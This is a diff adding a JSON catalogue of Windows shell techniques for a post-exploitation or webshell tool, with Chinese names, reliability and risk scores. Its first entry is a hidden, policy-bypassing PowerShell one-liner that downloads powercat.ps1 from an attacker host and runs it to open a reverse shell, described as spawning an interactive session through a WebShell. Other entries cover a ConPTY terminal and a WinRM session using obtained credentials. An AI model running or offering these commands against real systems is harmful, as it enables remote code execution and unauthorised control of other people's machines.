@@ -1,0 +1,52 @@
+[
+  {
+    "id": "win-ps",
+    "name": "PowerShell 交互会话",
+    "platform": "windows",
+    "target": "Windows",
+    "needs": [
+      "powershell"
+    ],
+    "reliability": 85,
+    "risk": "medium",
+    "cmd": "powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"IEX(New-Object Net.WebClient).DownloadString('http://$LHOST/powercat.ps1'); powercat -c $LHOST -p $LPORT -ep\"",
+    "note": "经 WebShell 起 PowerShell 反向会话，得到可交互的 PowerShell。"
+  },
+  {
+    "id": "win-conpty",
+    "name": "ConPTY 伪终端（Win10+）",
+    "platform": "windows",
+    "target": "Windows",
+    "needs": [
+      "powershell"
+    ],
+    "reliability": 78,
+    "risk": "medium",
+    "cmd": "powershell -NoP -Exec Bypass -Command \"[System.Diagnostics.Process]::Start('cmd.exe')\"",
+    "note": "Win10 1809+ 支持 ConPTY，可得到带 TTY 的 cmd；老系统需用第三方 PTY。"
+  },
+  {
+    "id": "win-cmd",
+    "name": "cmd 交互加固",
+    "platform": "windows",
+    "target": "Windows",
+    "needs": [],
+    "reliability": 70,
+    "risk": "low",
+    "cmd": "cmd.exe /K chcp 65001 && cls",
+    "note": "修正代码页避免中文乱码，/K 保持会话不退出。"
+  },
+  {
+    "id": "win-winrm",
+    "name": "WinRM 稳定会话",
+    "platform": "windows",
+    "target": "Windows",
+    "needs": [
+      "winrm"
+    ],
+    "reliability": 90,
+    "risk": "low",
+    "cmd": "Enter-PSSession -ComputerName $TARGET -Credential $CRED",
+    "note": "已有凭据时改用 WinRM 建立原生交互会话，比 WebShell 稳定得多。"
+  }
+]
